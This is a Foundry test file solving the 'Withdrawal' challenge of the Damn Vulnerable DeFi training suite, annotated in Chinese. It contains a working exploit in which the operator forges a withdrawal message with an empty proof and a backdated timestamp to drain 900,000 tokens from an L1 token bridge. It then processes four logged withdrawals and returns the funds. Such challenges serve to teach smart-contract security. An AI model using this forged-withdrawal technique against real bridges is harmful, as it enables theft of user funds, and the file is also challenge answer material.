// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

// Adding
import {VmSafe} from "forge-std/Vm.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        // 设置时间戳
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();
        // 只部署了 L1 层的合约

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        // l1TokenBridge 持有大量 Token
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        // 我们是管理员 player
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    struct Log {
        bytes data; // data必须在前
        bytes32[] topics;
    }   

    struct TxParams {
        uint256 nonce;  // indexed
        address l2Sender; // indexed
        address target; // indexed
        bytes32 id;
        uint256 timestamp;
        bytes data;
    }


    function test_withdrawal() public checkSolvedByPlayer {
        /*
            作为管理员，伪造一笔提款交易, 从 tokenBridge 先行撤出资金
        */
 
        // 要实现交易执行, 需要通过 l1Gateway.finalizeWithdrawal 来执行 message
        uint256 WITHDRAW_AMOUNT = 900_000e18;
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0, // nonce
                address(0), //  
                address(l1TokenBridge), // target
                abi.encodeCall( // message
                    TokenBridge.executeTokenWithdrawal, // 需要由 L1Forwarder 调用
                    (
                        player, // deployer receiver
                        WITHDRAW_AMOUNT //rescue 900_000e18
                    )
                )
            )
        );
        // 使用l1Gateway.finalizeWithdrawal执行这笔交易
        l1Gateway.finalizeWithdrawal(
            0, // nonce
            l2Handler, // pretend l2Handler 
            address(l1Forwarder), // target is l1Forwarder
            block.timestamp - 7 days, // to pass 7 days waiting peroid
            message, 
            new bytes32[](0)   
        );

        /*
            执行给定的这 4 笔交易
        */
        
        // 将 log 解析为 交易参数
        // log 对应事件：L2MessageStore.MessageStored
        // event MessageStored(bytes32 id, uint256 indexed nonce, address indexed caller, address indexed target, uint256 timestamp, bytes data);
        Log[] memory logs = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json"))), (Log[]));
        uint256 txsCount = logs.length;
        TxParams[] memory txs = new TxParams[](txsCount);
        
        for (uint256 i = 0; i < txsCount; i++) {
            Log memory _log = logs[i];
            // 未Indexed的,从 data 中取 
            (bytes32 id, uint256 timestamp, bytes memory data) = abi.decode(_log.data, (bytes32, uint256, bytes));

            TxParams memory _tx = TxParams({
                // Indexed 参数 从 topics 中取
                nonce: uint256(_log.topics[1]),
                l2Sender: address(uint160(uint256(_log.topics[2]))),
                target: address(uint160(uint256(_log.topics[3]))),
                // 未Indexed
                id: id,
                timestamp: timestamp,
                data: data
            });
            txs[i] = _tx;

            // // 验证事件参数
            // assertEq(_log.topics[0], L2MessageStore.MessageStored.selector); // selector
            // assertEq(_log.topics[1], bytes32(i)); // nonce
            // assertEq(_log.topics[2], vm.parseBytes32("0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16")); // caller
            // assertEq(_log.topics[3], vm.parseBytes32("0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5")); // l1Forwarder-target
          
            // // //  console.log 打印 bytes 数据可以使用 vm.toString
            // console.log("index-----------------: ", i);
            // console.log("id: ", vm.toString(id));
            // console.log("timestamp: ", vm.toString(timestamp));
            // console.log("data: %s", vm.toString(data));

            // 验证 id
            assertEq(
                id,
                keccak256(
                    abi.encode(
                        _tx.nonce, 
                        _tx.l2Sender, 
                        _tx.target, 
                        _tx.timestamp, 
                        _tx.data
                    )
                )
            );
        }
        // 由于执行时间戳为 START_TIMESTAMP = 1718786915
        // 交易执行要比传入时间戳至少延迟 7 天
        // txs[0].timestamp 最小，让其满足，其他时间戳也就满足了
        vm.warp(txs[0].timestamp + 8 days);
        for(uint256 i = 0; i < txsCount; i++) {
            l1Gateway.finalizeWithdrawal({
                nonce: txs[i].nonce,
                l2Sender: txs[i].l2Sender,
                target: txs[i].target,
                timestamp: txs[i].timestamp,
                message: txs[i].data,
                proof: new bytes32[](0)
            });

            // 查看执行状态
            // finalizeWithdrawal中的参数data, 即为forwardMessage中计算messageId的值
            bytes32 id = keccak256(txs[i].data);
            console.log("l1Forwarder execute status: ", 
                i,
                l1Forwarder.successfulMessages(id),
                l1Forwarder.failedMessages(id)
            );

        }
        // 交易执行后状态验证
        // 第三笔问题交易执行失败, 有记录
        //   l1Forwarder execute status:  0 true false
        //   l1Forwarder execute status:  1 true false
        //   l1Forwarder execute status:  2 false true  // successfulMessages->false, failedMessages->true
        //   l1Forwarder execute status:  3 true false


        /*
            再将资产转回到 tokenBridge
        */
        
        token.transfer(address(l1TokenBridge), WITHDRAW_AMOUNT);
    }



    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        // l1TokenBridge 代币余额必须  99万 < x < 100 万
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        // 
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        // l1Gateway的counter大于 4, 表明完成提款
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        // 下面提款 id 必须被标记为完成
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
